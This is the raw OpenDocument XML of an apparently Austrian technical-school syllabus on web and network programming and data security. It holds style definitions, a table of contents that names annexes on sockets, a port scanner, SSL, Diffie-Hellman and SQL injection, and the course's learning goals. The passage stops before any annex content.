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Verdana4" svg:font-family="Verdana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88cm" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle1.A" style:family="table-column">
      <style:table-column-properties style:column-width="2.226cm"/>
    </style:style>
    <style:style style:name="Tabelle1.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.762cm"/>
    </style:style>
    <style:style style:name="Tabelle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#e6e6ff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999cm" table:align="left" fo:background-color="#ffffff">
        <style:background-image/>
      </style:table-properties>
    </style:style>
    <style:style style:name="Tabelle4.A" style:family="table-column">
      <style:table-column-properties style:column-width="2.771cm"/>
    </style:style>
    <style:style style:name="Tabelle4.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.228cm"/>
    </style:style>
    <style:style style:name="Tabelle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le4.A2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elle4.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Tabelle4.B3" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Tabelle4.B5" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Tabelle4.B6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360d57" officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:paragraph-rsid="00554440" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:paragraph-rsid="00615a90" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00554440" officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00590b16" officeooo:paragraph-rsid="00590b16"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00590b16"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00575609" officeooo:paragraph-rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a8962" officeooo:paragraph-rsid="005a8962"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005a8962" officeooo:paragraph-rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="005a8962"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="005b7aa7" officeooo:paragraph-rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:snap-to-layout-grid="false"/>
      <style:text-properties officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001589f7" officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001409f6" officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0015d8a7" officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00658d49"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0067baa7"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00683f43" officeooo:paragraph-rsid="00683f43"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0030dda8" officeooo:paragraph-rsid="0030dda8"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="005b7aa7" officeooo:paragraph-rsid="005f30bc"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="005b7aa7" officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001122c3" officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001589f7" officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0030dda8"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0062fb6d" officeooo:paragraph-rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="000746fd" officeooo:paragraph-rsid="00658d49"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="00665c16"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties officeooo:paragraph-rsid="00615a90" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:paragraph-rsid="00658d49" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties officeooo:paragraph-rsid="0067baa7"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0.106cm" fo:margin-bottom="0.106cm" style:contextual-spacing="false"/>
      <style:text-properties officeooo:rsid="005b7aa7" officeooo:paragraph-rsid="00658d49"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:rsid="0067baa7" officeooo:paragraph-rsid="0067baa7"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0067baa7"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" style:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="0067baa7"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:text-properties officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name=""/>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4"/>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties officeooo:rsid="005b7aa7"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties officeooo:rsid="005c47b7"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties officeooo:rsid="005c47b7" officeooo:paragraph-rsid="005f86f5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officeooo:paragraph-rsid="00063b7c"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0003f791" officeooo:paragraph-rsid="00658d49"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0.106cm" fo:margin-bottom="0.106cm" style:contextual-spacing="false"/>
      <style:text-properties style:text-position="0% 100%" style:font-name="Arial" fo:font-size="9pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="000746fd" officeooo:paragraph-rsid="00658d49" style:font-size-asian="9pt" style:font-weight-asian="bold" style:font-name-complex="Arial" style:font-size-complex="9pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="0009f396" officeooo:paragraph-rsid="000bd18f"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="005b7aa7"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="0009f396" officeooo:paragraph-rsid="000bd18f"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="0062fb6d" officeooo:paragraph-rsid="00683f43"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="005b7aa7" officeooo:paragraph-rsid="005f30bc"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="00615a90"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="005a8962"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="0067baa7"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="005c47b7"/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Heading_20_2">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:paragraph-rsid="00554440"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:paragraph-rsid="005a8962"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:rsid="005a8962" officeooo:paragraph-rsid="005a8962"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties officeooo:paragraph-rsid="005f86f5"/>
    </style:style>
    <style:style style:name="P6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officeooo:rsid="0009b74b"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="000bd18f"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-style="normal" officeooo:rsid="003cf4dc" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00554440"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="005a8962"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties style:font-name="Verdana4"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Verdana4" officeooo:rsid="005b7aa7"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Verdana4" fo:font-style="normal" officeooo:rsid="005b7aa7" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="005b7aa7"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="005c47b7"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="005f30bc"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="005f86f5"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="0015d8a7"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="00615a90"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-style="italic" fo:background-color="#90ee90" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-style="italic" fo:background-color="#ffc0cb" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="001589f7"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:font-name="Courier 10 Pitch" officeooo:rsid="001409f6"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:font-name="Courier 10 Pitch" officeooo:rsid="001589f7"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:font-name="Courier 10 Pitch" fo:font-weight="bold" officeooo:rsid="001409f6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties style:font-name="Courier 10 Pitch" fo:font-weight="bold" officeooo:rsid="001589f7" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties style:font-name="Courier 10 Pitch" fo:font-weight="bold" officeooo:rsid="000746fd" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties style:font-name="Courier 10 Pitch" fo:font-weight="bold" officeooo:rsid="0010ba33" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="001409f6"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="000746fd"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="0019acfe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019acfe" fo:background-color="#ffff00" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="001589f7" fo:background-color="#ffff00" loext:char-shading-value="0"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="001122c3"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="0062fb6d"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="00658d49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665c16"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties officeooo:rsid="0067baa7"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties officeooo:rsid="0069b6c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69"><text:a xlink:type="simple" xlink:href="#__RefHeading__5732_1458299649" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1. </text:a>Themenbereich: WEB-NW-PROG-DATENSICHERHEIT<text:tab/>2</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__5734_1458299649" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.1. </text:a>Rechtliche Grundlage: Lehrplan<text:tab/>2</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__5736_1458299649" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2. </text:a>Bildungs- und Lehraufgabe:WEB-NW-PROG-DATENSICHERHEIT<text:tab/>2</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__8232_1751216161" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.3. </text:a>Schulautonome Änderungen<text:tab/>3</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__8247_1751216161" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.4. </text:a>Lernunterlagen<text:tab/>3</text:p>
          <text:p text:style-name="P69"><text:a xlink:type="simple" xlink:href="#__RefHeading__21122_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2. </text:a>WEB-NW-PROG: Socket, Webservice, REST<text:tab/>3</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__8475_2092099876" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.1. </text:a>Socket-C: Anlage portscanner<text:tab/>3</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__8477_2092099876" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.2. </text:a>Socket-C: Grundlagen<text:tab/>3</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__8479_2092099876" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.3. </text:a>+Socket-Java: Grundlagen<text:tab/>3</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__23584_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.4. </text:a>Socket-CPP: Anlage Socket-CPP<text:tab/>4</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__23586_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.5. </text:a>Webservices ???<text:tab/>4</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__23588_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.6. </text:a>REST ???<text:tab/>4</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__23590_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.7. </text:a>REST und Authentifizierungsmechanismen ???<text:tab/>4</text:p>
          <text:p text:style-name="P69"><text:a xlink:type="simple" xlink:href="#__RefHeading__21126_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3. </text:a>SEC: Sicherheit, Datenschutz<text:tab/>4</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__14221_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.1. </text:a>+SENG-RECHT: Lizenzmodelle<text:tab/>4</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21124_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.2. </text:a>+SENG-RECHT: Datenschutz<text:tab/>5</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21128_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.3. </text:a>SEC:ANLAGE SSL.<text:tab/>5</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__23561_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.4. </text:a>SEC-DB: Anlage DB-SEC:grant , Anlage DB-SEC:Sql-Injection<text:tab/>5</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__6324_1762544912" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.5. </text:a>SEC-PHP: Sql-injection<text:tab/>5</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21048_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.6. </text:a>SEC: Anlage Diffie-Hellman<text:tab/>6</text:p>
          <text:p text:style-name="P69"><text:a xlink:type="simple" xlink:href="#__RefHeading__5912_1458299649" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4. </text:a>Anlagen: WEB-NW-PROG-DATENSICHERHEIT<text:tab/>7</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__8481_2092099876" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.1. </text:a>Anlage: portscanner.c<text:tab/>8</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__6326_1762544912" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.2. </text:a>Anlage Socket-CPP 1/2<text:tab/>9</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__6328_1762544912" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.3. </text:a>Anlage Socket-CPP 2/2<text:tab/>10</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21050_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.4. </text:a>ANLAGE Diffie-Hellman 1/2<text:tab/>11</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21052_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.5. </text:a>ANLAGE Diffie-Hellman 2/2<text:tab/>12</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21132_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.6. </text:a>ANLAGE SSL 1/3<text:tab/>13</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21134_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.7. </text:a>ANLAGE SSL 2/3<text:tab/>14</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__21136_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.8. </text:a>ANLAGE SSL 3/3<text:tab/>15</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__23563_660407764" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.9. </text:a>ANLAGE: DB-SEC: SQL-Injection<text:tab/>16</text:p>
          <text:p text:style-name="P70"><text:a xlink:type="simple" xlink:href="#__RefHeading__7861_1458299649" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">4.10. </text:a>ANLAGE: DB-SEC: grant<text:tab/>17</text:p>
        </text:index-body>
      </text:table-of-content>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="P51" text:outline-level="1"><text:bookmark-start text:name="__RefHeading__5732_1458299649"/><text:soft-page-break/>Themenbereich: <text:span text:style-name="T4">WEB-NW-PROG-DATENSICHERHEIT</text:span><text:bookmark-end text:name="__RefHeading__5732_1458299649"/></text:h>
      <text:h text:style-name="P54" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__5734_1458299649"/>Rechtliche Grundlage: Lehrplan<text:bookmark-end text:name="__RefHeading__5734_1458299649"/></text:h>
      <text:p text:style-name="Standard"><text:bookmark-start text:name="__RefHeading__5980_1458299649"/>Höhere Lehranstalt für Elektronik und Technische Informatik<text:bookmark-end text:name="__RefHeading__5980_1458299649"/></text:p>
      <text:list xml:id="list7000277808919050286" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P48"><text:a xlink:type="simple" xlink:href="http://www.htl.at/fileadmin/content/Lehrplan/HTL_VO_2011/BGBl_II_Nr_300_2011_Anlage_1_2.pdf">Lehrplan (Anlage 1.2) (442kb)</text:a><text:line-break/><text:a xlink:type="simple" xlink:href="http://www.htl.at/fileadmin/content/Lehrplan/HTL_VO_2011/BGBl_II_Nr_300_2011_Anlage_1.pdf">Allgemeine Bestimmungen (Anlage 1) (1061kb)</text:a><text:line-break/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P48">Jahr der Inkraftsetzung: 2011<text:line-break/>Verordnung </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47"><text:a xlink:type="simple" xlink:href="http://www.htl.at/fileadmin/content/Lehrplan/HTL_VO_2011/BGBl_II_Nr_300_2011.pdf">BGBl. II Nr. 300/2011</text:a></text:p>
          <text:p text:style-name="P48"/>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P55" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__5736_1458299649"/><text:span text:style-name="T2">Bildungs- und Lehraufgabe</text:span>:<text:span text:style-name="T4">WEB-NW-PROG-DATENSICHERHEIT</text:span> <text:bookmark-end text:name="__RefHeading__5736_1458299649"/></text:h>
      <text:p text:style-name="P2">WEB-NW-PROG</text:p>
      <text:p text:style-name="P2">Die Schülerinnen und Schüler</text:p>
      <text:p text:style-name="P2"><text:tab/>- verstehen den Unterschied zwischen client- und serverseitigen </text:p>
      <text:p text:style-name="P2"><text:tab/><text:tab/>Technologien und </text:p>
      <text:p text:style-name="P2"><text:tab/>- kennen aktuelle Vertreter beider Bereiche;</text:p>
      <text:p text:style-name="P2"><text:tab/>- können den Aufbau und das ergonomische Design von Webseiten gestalten;</text:p>
      <text:p text:style-name="P2"><text:tab/>- können unterschiedliche Authentifizierungsmechanismen hinsichtlich </text:p>
      <text:p text:style-name="P2"><text:tab/><text:tab/>ihrer Eignung für konkrete Aufgabenstellungen bewerten, </text:p>
      <text:p text:style-name="P2"><text:tab/>- Teilfunktionalitäten auf geeignete Knoten eines verteilten Systems </text:p>
      <text:p text:style-name="P2"><text:tab/><text:tab/>anordnen, </text:p>
      <text:p text:style-name="P2"><text:tab/>- Server einrichten und </text:p>
      <text:p text:style-name="P2"><text:tab/>- diese innerhalb eines vorgegebenen Netzwerkes zur Verfügung stellen (V).<text:line-break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Jahrgang </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.B1" office:value-type="string">
            <text:p text:style-name="P3">Inhalt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A6" office:value-type="string">
            <text:p text:style-name="P2">I</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.B6" office:value-type="string">
            <text:p text:style-name="P2"/>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A6" office:value-type="string">
            <text:p text:style-name="P2">II</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.B6" office:value-type="string">
            <text:p text:style-name="P2">Ergonomisches Design.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A6" office:value-type="string">
            <text:p text:style-name="P2">III</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.B6" office:value-type="string">
            <text:p text:style-name="P2">Web-Programmierung.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A6" office:value-type="string">
            <text:p text:style-name="P2">IV</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.B6" office:value-type="string">
            <text:p text:style-name="P2">Client-Server-Architektur.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tabelle1.A6" office:value-type="string">
            <text:p text:style-name="P2">V</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tabelle1.B6" office:value-type="string">
            <text:p text:style-name="P7">Authentifizierungsverfahren; Security. (V).</text:p>
            <text:p text:style-name="P6">Schutz vor Datenmissbrauch und Datenverlust. </text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__8232_1751216161"/><text:soft-page-break/>Schulautonome Änderungen<text:bookmark-end text:name="__RefHeading__8232_1751216161"/></text:h>
      <text:p text:style-name="P5">keine</text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__8247_1751216161"/>Lernunterlagen<text:bookmark-end text:name="__RefHeading__8247_1751216161"/></text:h>
